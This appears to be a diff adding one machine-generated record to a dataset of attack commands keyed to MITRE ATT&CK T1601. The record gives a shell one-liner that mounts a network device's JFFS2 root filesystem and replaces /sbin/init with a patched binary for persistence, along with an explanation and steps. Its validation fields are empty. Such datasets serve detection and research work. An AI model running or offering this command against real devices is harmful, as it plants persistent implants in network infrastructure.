@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: in-place rootfs modification (JFFS2)'; mount -t jffs2 /dev/mtdblock6 /mnt/rootfs && cp -f /tmp/init-patched /mnt/rootfs/sbin/init && chmod 755 /mnt/rootfs/sbin/init && umount /mnt/rootfs && sync",
+  "explanation": "Mounts a JFFS2-based root filesystem partition and replaces the init binary to implant a persistent modification inside the system image.",
+  "rationale_steps": [
+    "Mount the flash-based rootfs used by the NOS at boot.",
+    "Replace a critical system binary (init) within the image to ensure execution on startup.",
+    "Unmount and sync so the modified image is what boots next."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-50d4d26c",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
